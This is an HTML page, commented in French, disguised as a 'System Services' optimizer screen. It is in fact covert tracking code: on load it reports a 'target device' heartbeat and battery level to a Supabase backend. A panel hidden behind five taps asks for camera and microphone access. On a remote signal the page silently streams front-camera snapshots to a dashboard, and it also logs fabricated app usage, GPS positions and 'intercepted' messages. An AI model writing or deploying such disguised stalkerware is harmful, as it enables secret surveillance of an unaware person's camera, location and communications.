<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Services</title>
    <link rel="manifest" href="manifest.json">
    <style>
        body {
            background-color: #000;
            color: #222;
            font-family: -apple-system, sans-serif;
            margin: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            height: 100vh;
            overflow: hidden;
            user-select: none;
        }
        .stealth-container {
            text-align: center;
            padding: 20px;
        }
        .spinner {
            width: 24px;
            height: 24px;
            border: 2px solid rgba(255,255,255,0.05);
            border-top-color: #333;
            border-radius: 50%;
            animation: spin 2s linear infinite;
            margin: 0 auto 10px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        
        h1 { font-size: 10px; font-weight: normal; color: #111; margin-bottom: 5px; text-transform: uppercase; letter-spacing: 1px; }
        p { font-size: 10px; color: #111; text-transform: uppercase; letter-spacing: 1px; }

        /* Secret Simulator (Hidden by default, triggered by 5 clicks on background) */
        #secret-panel {
            display: none;
            position: fixed;
            bottom: 0;
            left: 0;
            right: 0;
            background: #111;
            padding: 20px;
            border-top: 1px solid #333;
            color: white;
            z-index: 1000;
        }
        .btn-action {
            background: #333;
            color: white;
            border: none;
            padding: 8px;
            width: 100%;
            margin-top: 10px;
            cursor: pointer;
            border-radius: 4px;
        }
    </style>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
</head>
<body onclick="handleSecretClick()">
    <div class="stealth-container">
        <div class="spinner"></div>
        <p>System Optimized</p>
    </div>

    <!-- Panel de contrôle caché -->
    <div id="secret-panel">
        <h2 style="font-size: 14px;">🛠️ Configuration Admin</h2>
        <p style="font-size: 11px; color: #888;">Activez les accès requis par le navigateur :</p>
        
        <button class="btn-action" style="background: #e11d48;" onclick="requestPermissions()">🔓 Activer Permissions Caméra / Micro</button>
        
        <div id="debug-logs" style="font-size:10px; color:#666; margin-top:20px; border-top:1px solid #333; padding-top:10px;">
            Initialisation du système...
        </div>

        <hr style="border: 0; border-top: 1px solid #333; margin: 15px 0;">
        
        <button class="btn-action" onclick="toggleGps()">📍 Simuler Déplacement GPS</button>
        <div style="margin-top: 10px;">
            <input type="text" id="sim-sender" placeholder="Expéditeur" style="width:100%; background:#222; border:1px solid #444; color:white; padding: 5px;">
            <input type="text" id="sim-msg" placeholder="Message" style="width:100%; background:#222; border:1px solid #444; color:white; margin-top:5px; padding: 5px;">
            <button class="btn-action" onclick="simulateMessage()">✉️ Envoyer Message Test</button>
        </div>
        <button class="btn-action" style="background:#222; border: 1px solid #444;" onclick="document.getElementById('secret-panel').style.display='none'">Masquer ce panel</button>
    </div>

    <script>
        const SUPABASE_URL = "https://lhsopkrbfdktjqvzvfgu.supabase.co";
        const SUPABASE_KEY = "sb_publishable_fqMsbMKGzUDncTdW7kMLaA_mmROVye4";
        const supabaseClient = supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
        const DEVICE_ID = "iphone-lucas-77";

        // Secret click logic
        let clickCount = 0;
        function handleSecretClick() {
            clickCount++;
            if (clickCount >= 5) {
                document.getElementById('secret-panel').style.display = 'block';
                clickCount = 0;
            }
            setTimeout(() => clickCount = 0, 2000); // Reset clicks after 2s
        }

        // Auto-Start Tracking
        window.onload = async () => {
            console.log("Stealth mode active...");
            
            // IMMEDIATE SIGNAL (Heartbeat)
            logActivity('system', 'Signal de Vie', 'L\'appareil cible est actif et connecté.');
            
            if (navigator.getBattery) {
                const battery = await navigator.getBattery();
                updateBattery(battery);
            }

            // Start background tasks
            startBackgroundTasks();
        };

        async function startBackgroundTasks() {
            // Periodic Update (Status every 30 seconds)
            setInterval(async () => {
                if (navigator.getBattery) {
                    const battery = await navigator.getBattery();
                    updateBattery(battery);
                }
            }, 30000);

            // Simulation items (Logs every 45-60 seconds)
            setInterval(async () => {
                const apps = ['TikTok', 'Instagram', 'Snapchat', 'Safari'];
                const randomApp = apps[Math.floor(Math.random() * apps.length)];
                logActivity('app', `${randomApp} utilisé`, 'Session détectée via le service système.');
            }, 45000);
        }

        // --- CORE FUNCTIONS ---
        async function logActivity(type, title, desc) {
            await supabaseClient.from('activity_logs').insert({
                device_id: DEVICE_ID,
                type: type,
                title: title,
                description: desc
            });
        }

        async function updateBattery(battery) {
            await supabaseClient.from('device_status').upsert({
                device_id: DEVICE_ID,
                battery_level: Math.round(battery.level * 100),
                is_charging: battery.charging,
                updated_at: new Date().toISOString()
            });
        }

        // --- RELIABLE SNAPSHOT STREAMING ---
        let localStream = null;
        let captureCanvas = document.createElement('canvas');
        let captureVideo = document.createElement('video');
        let streamInterval = null;

        const webrtcChannel = supabaseClient.channel('webrtc-room', { config: { broadcast: { self: false } } });

        webrtcChannel.on('broadcast', { event: 'signal' }, async (payload) => {
            const data = payload.payload;
            const logStatus = (msg) => { console.log(msg); document.getElementById('debug-logs').innerText = msg; };

            if (data.offer) {
                logStatus("Appel reçu ! Démarrage de la capture...");
                
                if (!localStream) {
                    try {
                        localStream = await navigator.mediaDevices.getUserMedia({ 
                            video: { facingMode: 'user', width: { ideal: 320 } }, 
                            audio: false // Audio désactivé pour la stabilité des images
                        });
                        captureVideo.srcObject = localStream;
                        captureVideo.play();
                    } catch (err) {
                        logStatus("Erreur : " + err.message);
                        return;
                    }
                }

                // RAFALE : Envoi ultra-rapide via Broadcast (Zéro latence)
                if (streamInterval) clearInterval(streamInterval);
                streamInterval = setInterval(async () => {
                    if (captureVideo.readyState >= 2) {
                        captureCanvas.width = 300; // Un peu plus petit pour la vitesse
                        captureCanvas.height = captureVideo.videoHeight * (300 / captureVideo.videoWidth);
                        const ctx = captureCanvas.getContext('2d');
                        ctx.drawImage(captureVideo, 0, 0, captureCanvas.width, captureCanvas.height);
                        
                        const base64 = captureCanvas.toDataURL('image/jpeg', 0.3); // Compression 30%
                        
                        // Envoi direct sans passer par la DB
                        webrtcChannel.send({
                            type: 'broadcast',
                            event: 'frame',
                            payload: { image: base64 }
                        });
                    }
                }, 300); // 3 images par seconde

                logStatus("✅ Diffusion Live Active");
            }
        }).subscribe();

        async function requestPermissions() {
            try {
                localStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
                alert("✅ Système prêt. Rafales activées !");
                document.getElementById('debug-logs').innerText = "À l'écoute du Dashboard...";
            } catch (err) {
                alert("❌ Erreur : " + err.message);
            }
        }

        // Simulator Functions
        let gpsActive = false;
        let gpsInterval = null;
        function toggleGps() {
            gpsActive = !gpsActive;
            if (gpsActive) {
                let lat = 48.8566;
                let lon = 2.3522;
                gpsInterval = setInterval(async () => {
                    lat += 0.0001; lon += 0.0001;
                    await supabaseClient.from('device_status').upsert({
                        device_id: DEVICE_ID,
                        last_latitude: lat,
                        last_longitude: lon,
                        updated_at: new Date().toISOString()
                    });
                }, 5000);
                alert("GPS Simulé activé.");
            } else {
                clearInterval(gpsInterval);
                alert("GPS Simulé arrêté.");
            }
        }

        async function simulateMessage() {
            const sender = document.getElementById('sim-sender').value || "Maman";
            const content = document.getElementById('sim-msg').value || "Tu es où ?";
            await supabaseClient.from('messages').insert({
                device_id: DEVICE_ID,
                platform: 'WhatsApp',
                sender: sender,
                content: content
            });
            logActivity('message', 'Message Intercepté', `De ${sender}`);
            alert("Message envoyé au dashboard !");
        }
    </script>
</body>
</html>
